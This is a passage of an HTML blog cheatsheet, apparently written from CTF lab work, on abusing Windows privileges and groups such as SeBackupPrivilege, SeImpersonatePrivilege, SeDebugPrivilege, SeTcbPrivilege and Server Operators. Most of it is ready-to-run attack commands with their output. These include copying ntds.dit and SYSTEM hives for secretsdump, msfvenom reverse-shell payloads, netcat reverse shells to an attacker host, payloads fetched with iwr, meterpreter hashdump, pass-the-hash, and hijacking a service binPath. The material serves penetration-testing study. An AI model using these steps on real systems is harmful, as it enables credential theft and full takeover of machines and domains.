<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Windows Privilege Escalation | serioton</title><meta name="author" content="serioton"><meta name="copyright" content="serioton"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="practical techniques for abusing some windows privileges and built-in security groups">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows Privilege Escalation">
<meta property="og:url" content="https://seriotonctf.github.io/2024/08/10/Windows-Privesc/index.html">
<meta property="og:site_name" content="serioton">
<meta property="og:description" content="practical techniques for abusing some windows privileges and built-in security groups">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Feb66e480-7ab5-4a3e-bbd1-9c56c1cf2b3f%2Fcat2.png?table=block&id=47c9e554-38f8-4c65-81cc-abad857404d6&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1420&userId=&cache=v2">
<meta property="article:published_time" content="2024-08-10T15:00:00.000Z">
<meta property="article:modified_time" content="2024-11-13T09:35:47.531Z">
<meta property="article:author" content="serioton">
<meta property="article:tag" content="ctf,writeups,vulnlab,hackthebox,htb,thm,cheatsheet">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Feb66e480-7ab5-4a3e-bbd1-9c56c1cf2b3f%2Fcat2.png?table=block&id=47c9e554-38f8-4c65-81cc-abad857404d6&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1420&userId=&cache=v2"><link rel="shortcut icon" href="/img/iconcat.png"><link rel="canonical" href="https://seriotonctf.github.io/2024/08/10/Windows-Privesc/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Windows Privilege Escalation',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-11-13 09:35:47'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = url => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      link.onload = () => resolve()
      link.onerror = () => reject()
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/cat.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/train_travel.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="serioton"><img class="site-icon" src="/img/cat.jpg"/><span class="site-name">serioton</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Windows Privilege Escalation</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">Created</span><time datetime="2024-08-10T15:00:00.000Z" title="Created 2024-08-10 15:00:00">2024-08-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/cheatsheet/">cheatsheet</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Privileges"><a href="#Privileges" class="headerlink" title="Privileges"></a>Privileges</h1><h2 id="SeBackupPrivilege"><a href="#SeBackupPrivilege" class="headerlink" title="SeBackupPrivilege"></a>SeBackupPrivilege</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">...</span><br><span class="line">SeBackupPrivilege             Back up files and directories  Enabled</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="Disk-Shadow-method"><a href="#Disk-Shadow-method" class="headerlink" title="Disk Shadow method"></a>Disk Shadow method</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters </span><br><span class="line">add volume c: alias pwn </span><br><span class="line">create </span><br><span class="line">expose %pwn% z: </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; upload pwn.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; type pwn.txt</span><br><span class="line">set context persistent nowriters </span><br><span class="line">add volume c: alias pwn </span><br><span class="line">create </span><br><span class="line">expose %pwn% z: </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; diskshadow /s pwn.txt</span><br><span class="line">Microsoft DiskShadow version 1.0</span><br><span class="line">Copyright (C) 2013 Microsoft Corporation</span><br><span class="line">On computer:  BABYDC,  8/9/2024 10:57:34 PM</span><br><span class="line"></span><br><span class="line">-&gt; set context persistent nowriters</span><br><span class="line">-&gt; add volume c: alias pwn</span><br><span class="line">-&gt; create</span><br><span class="line">Alias pwn for shadow ID &#123;041d93f3-797d-4f91-a270-5c1fb66092e6&#125; set as environment variable.</span><br><span class="line">Alias VSS_SHADOW_SET for shadow set ID &#123;7df9215a-2efb-4a28-befe-cbaf15deba8c&#125; set as environment variable.</span><br><span class="line"></span><br><span class="line">Querying all shadow copies with the shadow copy set ID &#123;7df9215a-2efb-4a28-befe-cbaf15deba8c&#125;</span><br><span class="line"></span><br><span class="line">        * Shadow copy ID = &#123;041d93f3-797d-4f91-a270-5c1fb66092e6&#125;               %pwn%</span><br><span class="line">                - Shadow copy set: &#123;7df9215a-2efb-4a28-befe-cbaf15deba8c&#125;       %VSS_SHADOW_SET%</span><br><span class="line">                - Original count of shadow copies = 1</span><br><span class="line">                - Original volume name: \\?\Volume&#123;1b77e212-0000-0000-0000-100000000000&#125;\ [C:\]</span><br><span class="line">                - Creation time: 8/9/2024 10:57:36 PM</span><br><span class="line">                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</span><br><span class="line">                - Originating machine: BabyDC.baby.vl</span><br><span class="line">                - Service machine: BabyDC.baby.vl</span><br><span class="line">                - Not exposed</span><br><span class="line">                - Provider ID: &#123;b5946137-7b9f-4925-af80-51abd60b20d5&#125;</span><br><span class="line">                - Attributes:  No_Auto_Release Persistent No_Writers Differential</span><br><span class="line"></span><br><span class="line">Number of shadow copies listed: 1</span><br><span class="line">-&gt; expose %pwn% z:</span><br><span class="line">-&gt; %pwn% = &#123;041d93f3-797d-4f91-a270-5c1fb66092e6&#125;</span><br><span class="line">The shadow copy was successfully exposed as z:\.</span><br><span class="line">-&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; robocopy /b z:\windows\ntds . ntds.dit</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">   ROBOCOPY     ::     Robust File Copy for Windows</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">  Started : Friday, August 9, 2024 10:57:58 PM</span><br><span class="line">   Source : z:\windows\ntds\</span><br><span class="line">     Dest : C:\temp\</span><br><span class="line"></span><br><span class="line">    Files : ntds.dit</span><br><span class="line"></span><br><span class="line">  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">                           1    z:\windows\ntds\</span><br><span class="line">            New File              16.0 m        ntds.dit</span><br><span class="line"></span><br><span class="line">[snipped]</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; reg save HKLM\SYSTEM c:\temp\system</span><br><span class="line">The operation completed successfully.</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; download system</span><br><span class="line"></span><br><span class="line">Info: Downloading C:\temp\system to system</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; download ntds.dit</span><br><span class="line"></span><br><span class="line">Info: Downloading C:\temp\ntds.dit to ntds.dit</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  secretsdump.py -system system -ntds ntds.dit local</span><br></pre></td></tr></table></figure>
<h2 id="SeLoadDriverPrivilege"><a href="#SeLoadDriverPrivilege" class="headerlink" title="SeLoadDriverPrivilege"></a>SeLoadDriverPrivilege</h2><p>-&gt; <a target="_blank" rel="noopener" href="https://github.com/k4sth4/SeLoadDriverPrivilege">https://github.com/k4sth4/SeLoadDriverPrivilege</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; upload Capcom.sys</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; upload ExploitCapcom.exe</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; upload eoploaddriver_x64.exe</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; upload shell.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; .\eoploaddriver_x64.exe System\CurrentControlSet\dfserv C:\temp\Capcom.sys</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; .\ExploitCapcom.exe LOAD \temp\Capcom.sys</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; .\ExploitCapcom.exe EXPLOIT .\shell.exe</span><br></pre></td></tr></table></figure>
<h2 id="SeImpersonatePrivilege"><a href="#SeImpersonatePrivilege" class="headerlink" title="SeImpersonatePrivilege"></a>SeImpersonatePrivilege</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                               State</span><br><span class="line">============================= ========================================= ========</span><br><span class="line">...</span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\programdata&gt; iwr http://&lt;tun0&gt;/GodPotato-NET4.exe -outfile gp.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PS C:\programdata&gt; .\gp.exe -cmd &quot;C:\Users\Public\nc64.exe -e cmd.exe &lt;tun0&gt; &lt;port&gt;&quot;</span><br><span class="line">[*] CombaseModule: 0x140733127524352</span><br><span class="line">[*] DispatchTable: 0x140733130111304</span><br><span class="line">[*] UseProtseqFunction: 0x140733129406688</span><br><span class="line">[*] UseProtseqFunctionParamCount: 6</span><br><span class="line">[*] HookRPC</span><br><span class="line">[*] Start PipeServer</span><br><span class="line">[*] CreateNamedPipe \\.\pipe\eb27b3cc-7b5a-420d-8f01-d3094f6ee323\pipe\epmapper</span><br><span class="line">[*] Trigger RPCSS</span><br><span class="line">[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046</span><br><span class="line">[*] DCOM obj IPID: 00000402-0d08-ffff-8e84-859d1b28d501</span><br><span class="line">[*] DCOM obj OXID: 0xd402854b19147ceb</span><br><span class="line">[*] DCOM obj OID: 0x20ef4be3bfc76a84</span><br><span class="line">[*] DCOM obj Flags: 0x281</span><br><span class="line">[*] DCOM obj PublicRefs: 0x0</span><br><span class="line">[*] Marshal Object bytes len: 100</span><br><span class="line">[*] UnMarshal Object</span><br><span class="line">[*] Pipe Connected!</span><br><span class="line">[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">[*] CurrentsImpersonationLevel: Impersonation</span><br><span class="line">[*] Start Search System Token</span><br><span class="line">[*] PID : 892 Token:0x496  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation</span><br><span class="line">[*] Find System Token : True</span><br><span class="line">[*] UnmarshalObject: 0x80070776</span><br><span class="line">[*] CurrentUser: NT AUTHORITY\SYSTEM</span><br><span class="line">[*] process start with pid 3040</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  nc -nlvp 443</span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">connect to [10.8.0.210] from (UNKNOWN) [10.10.150.182] 54910</span><br><span class="line">Microsoft Windows [Version 10.0.20348.2340]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\programdata&gt;whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
<h2 id="SeDebugPrivilege"><a href="#SeDebugPrivilege" class="headerlink" title="SeDebugPrivilege"></a>SeDebugPrivilege</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f exe LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -o shell.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\temp&gt; iwr http://&lt;ip&gt;/shell.exe -outfile shell.exe</span><br><span class="line">PS C:\temp&gt; .\shell.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost tun0</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 443</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on &lt;attacker_ip&gt;:&lt;port&gt;</span><br><span class="line">[*] Sending stage (200774 bytes) to &lt;target_ip&gt;</span><br><span class="line">[*] Meterpreter session 1 opened [SNIP]</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -L 127.0.0.1 -l 445 -p 445 -r &lt;target_ip&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbexec administrator@127.0.0.1 -hashes :&lt;<span class="built_in">hash</span>&gt;</span><br></pre></td></tr></table></figure>
<h2 id="SeTcbPrivilege"><a href="#SeTcbPrivilege" class="headerlink" title="SeTcbPrivilege"></a>SeTcbPrivilege</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                         State</span><br><span class="line">============================= =================================== =======</span><br><span class="line">...</span><br><span class="line">SeTcbPrivilege                Act as part of the operating system Enabled</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>-&gt; <a target="_blank" rel="noopener" href="https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178">https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; iwr http://&lt;tun0&gt;/TcbElevation.exe -outfile TcbElevation.exe</span><br></pre></td></tr></table></figure>
<p>-&gt; <a target="_blank" rel="noopener" href="https://github.com/xct/rcat">https://github.com/xct/rcat</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; upload rcat_10.8.0.210_443.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; .\TcbElevation.exe pwn &quot;C:\Windows\system32\cmd.exe /c C:\Users\svc_deploy\Documents\rcat_10.8.0.210_443.exe&quot;</span><br><span class="line">Error starting service 1053</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  rlwrap nc -nlvp 443</span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">connect to [10.8.0.210] from (UNKNOWN) [10.10.153.117] 53924</span><br><span class="line">Microsoft Windows [Version 10.0.20348.2113]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
<h1 id="Groups"><a href="#Groups" class="headerlink" title="Groups"></a>Groups</h1><h2 id="Server-Operators-Group"><a href="#Server-Operators-Group" class="headerlink" title="Server Operators Group"></a>Server Operators Group</h2><p>Its members can sign-in to a server, start and stop services, access domain controllers, perform maintenance tasks (such as backup and restore), and they have the ability to change binaries that are installed on the domain controllers.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; net user svc-printer</span><br><span class="line">...</span><br><span class="line">Local Group Memberships      *Print Operators      *Remote Management Use</span><br><span class="line">                             *Server Operators</span><br><span class="line">Global Group memberships     *Domain Users</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; upload nc64.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; sc.exe config VMTools binPath=&quot;C:\temp\nc64.exe -e powershell.exe &lt;tun0&gt; &lt;port&gt;&quot;</span><br><span class="line">[SC] ChangeServiceConfig SUCCESS</span><br></pre></td></tr></table></figure>
